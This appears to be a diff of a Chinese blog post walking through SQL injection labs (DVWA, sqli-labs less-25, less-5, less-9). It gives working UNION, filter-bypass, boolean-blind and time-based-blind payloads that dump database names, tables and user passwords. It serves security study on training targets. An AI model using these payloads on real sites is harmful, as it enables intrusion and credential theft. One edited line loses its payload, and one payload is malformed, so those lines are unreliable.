@@ -187,25 +187,28 @@
 <h2>2.进入SQL Injection,开始注入</h2>
 <h3>（1）判断是数字型还是字符型</h3>
 <p>输入1发现没有报错，说明可以注入</p>
-<p>输入1'and'1'='1 ,没有报错</p>
-<p>输入1'and'1'='1 ，报错</p>
-<p>输入1'or'1'='1,输出多条结果，说明是字符型</p>
+<p>输入<code>1'and'1'='1</code> ,没有报错</p>
+<p>输入<code>1'and'1'='1</code>，报错</p>
+<p>输入<code>1'or'1'='1</code>,输出多条结果，说明是字符型</p>
 <h3>（2）猜解当前表中字段数</h3>
-<p>输入1' or '1'='1' order by 1 #   ,输出多条结果</p>
-<p>输入1' or '1'='1' order by 2 #，输出多条结果</p>
-<p>输入1' or '1'='1' order by 3 #，报错，说明只有2个字段</p>
+<p>输入<code>1' or '1'='1' order by 1 #</code>  ,输出多条结果</p>
+<p>输入<code>1' or '1'='1' order by 2 #</code>，输出多条结果</p>
+<p>输入<code>1' or '1'='1' order by 3 #</code>，报错，说明只有2个字段</p>
 <h3>（3）确定当前表中字段顺序</h3>
-<p>输入1' union select 1,2 #,输出多个结果，根据查询结果确定字段顺序</p>
+<p>输入<code>1' union select 1,2 #</code>,输出多个结果，根据查询结果确定字段顺序</p>
 <h3>（4）获取当前数据库信息</h3>
-<p>输入1' union select 1,database()#,可以得到数据库dvwa</p>
+<p>输入<code>1' union select 1,database()#</code>,可以得到数据库dvwa</p>
 <p><strong>注：union select语句前后需要保证字段个数一致，否则会报错</strong></p>
 <h3>（5）获得数据库中的表</h3>
-<p>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#，可知存在guest,users两张表</p>
+<p>输入<code>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
+<p>可知存在guest,users两张表</p>
 <h3>（6）从users表中获取字段名</h3>
-<p>输入1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #,得到字段 user_id,first_name,last_name,user,password,avatar</p>
+<p>输入<code>1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code></p>
+<p>得到字段 user_id,first_name,last_name,user,password,avatar</p>
 <p>注:字符型字段记得加引号，不然报错内。。。。</p>
 <h3>（7）获取信息</h3>
-<p>输入1' union select group_concat(user_id,first_name,last_name,user,avatar),group_concat(password) from users#,得到相关信息</p>
+<p>输入<code>1' union select group_concat(user_id,first_name,last_name,user,avatar),group_concat(password) from users#</code></p>
+<p>得到相关信息</p>
 <p><img src="https://i.imgur.com/NdBnBlq.png" alt=""></p>
 <h1>二.绕过简单SQL注入之less-25</h1>
 <hr>
@@ -216,47 +219,55 @@
 <p>URL中特殊字符相关资料参考链接<a href="https://www.cnblogs.com/cdxkyz/p/3976167.html" target="_blank" rel="noopener">https://www.cnblogs.com/cdxkyz/p/3976167.html</a></p>
 <p><img src="https://i.imgur.com/mVSHxZU.png" alt=""></p>
 <p>2.开始注入，</p>
-<p>输入1'|'1'='1' union select 1--+,报错</p>
-<p>输入1'|'1'='1' union select 1,2--+，报错</p>
-<p>输入1'|'1'='1' union select 1,2,3--+,查询成功,说明有三个字段</p>
-<p>输入-1' union select 1,2,3--+,查询成功</p>
+<p>输入<code>1'|'1'='1' union select 1--+</code>,报错</p>
+<p>输入<code>1'|'1'='1' union select 1,2--+</code>，报错</p>
+<p>输入<code>1'|'1'='1' union select 1,2,3--+</code>,查询成功,说明有三个字段</p>
+<p>输入<code>-1' union select 1,2,3--+</code>,查询成功</p>
 <p><img src="https://i.imgur.com/dwbklaB.png" alt=""></p>
-<p>可根据结果判断字段顺序，输入-1' union select 1,2,database()--+可以得到数据库名为security
-<img src="https://i.imgur.com/Wai0quK.png" alt=""></p>
-<p>继续输入-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'limit 0,1--+,可以得到表名</p>
+<p>可根据结果判断字段顺序，输入`</p>
+<p>`可以得到数据库名为security</p>
+<p><img src="https://i.imgur.com/Wai0quK.png" alt=""></p>
+<p>继续输入<code>-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'limit 0,1--+</code></p>
+<p>可以得到表名</p>
 <p><strong>注：其中发现因为or会被过滤，所以要用infoorrmation替代information，下同</strong></p>
 <p><img src="https://i.imgur.com/DrxRLTU.png" alt=""></p>
-<p>继续查询，进入表users,输入-1' union select 1,2,group_concat(column_name from infoorrmation_schema.tables where table_name='users' )--+,在表users中查询字段名得到结果id,username,password,id,username,password,sex,age,point,Id,username,password</p>
+<p>继续查询，进入表users,输入<code>-1' union select 1,2,group_concat(column_name from infoorrmation_schema.tables where table_name='users' )--+</code></p>
+<p>在表users中查询字段名得到结果id,username,password,id,username,password,sex,age,point,Id,username,password</p>
 <p><img src="https://i.imgur.com/IHCDhIV.png" alt=""></p>
 <p>可以得到最终信息，password的可能有：Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
 <p><img src="https://i.imgur.com/WSGNPik.png" alt=""></p>
 <h1>三.布尔型盲注之less-5</h1>
 <hr>
 <h2>1.猜解当前数据库的名称</h2>
-<p>输入1' and ascii(mid(database(),1,1))&gt;115--+'</p>
+<p>输入<code>1' and ascii(mid(database(),1,1))&gt;115--+'</code></p>
 <p>逐步手动猜解得到ASCII码：115 101 99 117 114 105 116 121</p>
 <p>得到库名：security</p>
 <h2>2.猜解数据库的表名</h2>
-<p>输入1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=114--+</p>
+<p>输入<code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=114--+</code></p>
 <p>手动猜解得到表emails,referers,uagents,users</p>
 <h2>3.猜解表users中的字段名</h2>
-<p>输入1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105--+，判断password在表users中</p>
+<p>输入<code>1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105--+</code></p>
+<p>判断password在表users中</p>
 <h2>4.猜解列名对应的内容</h2>
-<p>输入1' and ascii(substr((select username from security.users order by id limit 0,1),1,1))=68--+</p>
+<p>输入    <code>1' and ascii(substr((select username from security.users order by id limit 0,1),1,1))=68--+</code></p>
 <h1>五.时间型盲注之less-9</h1>
 <hr>
 <h2>1.判断是否有盲注点</h2>
 <p><strong>注：sql语句执行成功和失败的返回的页面不存在差异，需要通过以下语句判断是否存在时间型盲注点。</strong></p>
-<p>输入1' and if ('1'= '1',1, sleep(5)) --+</p>
+<p>输入<code>1' and if ('1'= '1',1, sleep(5)) --+</code></p>
 <p>没有延迟，返回为true，说明存在时间型盲注点</p>
 <h2>2.猜解当前数据库的名字</h2>
-<p>输入1' and if(ascii(substring(database(),1,1)) =115,1,sleep(5))--+，得到数据库名security</p>
+<p>输入<code>1' and if(ascii(substring(database(),1,1)) =115,1,sleep(5))--+</code></p>
+<p>得到数据库名security</p>
 <h2>3.猜解数据库的表名</h2>
-<p>输入1' and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,1,sleep(5))--+,若延时表示false,手动猜解该数据库中有表users</p>
+<p>输入<code>1' and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,1,sleep(5))--+</code></p>
+<p>若延时表示false,手动猜解该数据库中有表users</p>
 <h2>4.猜解表中的列名</h2>
-<p>输入1' and if(ascii(substring((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105, 1,sleep(5))--+,手动猜解发现存在字段password</p>
+<p>输入<code>1' and if(ascii(substring((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105, 1,sleep(5))--+</code></p>
+<p>手动猜解发现存在字段password</p>
 <h2>5.猜解列名对应的内容</h2>
-<p>输入1' and if(ascii(substr((select username from security.users order by id 	limit 0,1),1,1))=68,1,sleep(5))--+,手动猜解所需信息</p>
+<p>输入<code>1' and if(ascii(substr((select username from security.users order by id 	limit 0,1),1,1))=68,1,sleep(5))--+</code></p>
+<p>手动猜解所需信息</p>
 
                 <hr>
                 
